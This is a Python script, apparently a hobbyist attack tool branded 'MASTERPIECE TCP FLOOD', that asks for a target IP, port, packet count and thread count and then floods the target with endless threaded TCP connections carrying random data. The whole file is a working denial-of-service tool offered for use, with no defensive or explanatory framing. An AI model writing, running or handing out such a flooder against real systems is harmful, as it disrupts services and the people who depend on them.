#!/usr/bin/env python3
# -*- coding: utf-8 -*-s

import random
import socket
import threading
import time

print('''

\033[1;32m ███    ███\033[39m                   
\033[1;32m ████  ████\033[39m                
\033[1;32m ██ ████ ██  ██████\033[39m          
\033[1;32m ██  ██  ██       ██    ██ \033[39m   ┌┬┐┌─┐┌─┐
\033[1;32m ██      ██   █████   ██████\033[39m   │ │  ├─┘
\033[1;32m                  ██    ██\033[39m     ┴ └─┘┴  
\033[1;32m             ██████\033[39m 
                                                                                                              

 [\033[1;32mMASTERPIECE TCP FLOOD\033[39m]
 
 ''')
ip = str(input(" \033[96m@MasterPiec3+>\033[93m SERVER IP:\033[39m "))
port = int(input(" \033[96m@MasterPiec3+>\033[93m PORT: \033[39m"))
packets = int(input(" \033[96m@MasterPiec3+>\033[93m PACKETS PER CONNECTION: \033[39m"))
threads = int(input(" \033[96m@MasterPiec3+>\033[93m THREADS: \033[39m"))
choice = str(input(" \033[96m@MasterPiec3+>\033[93m PRESS ENTER TO START TCP FLOODING THE TARGET\033[39m"))

def run():
	data = random._urandom(16)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(packets):
				s.send(data)
			print(" \033[96m@MasterPiec3+>\033[1;32m PACKET SENT!\033[39m")
		except:
			s.close()
			print(" \033[96m@MasterPiec3+>\033[31m ERROR SENDING PACKET\033[39m")

for y in range(threads):
	if choice == '':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run)
		th.start()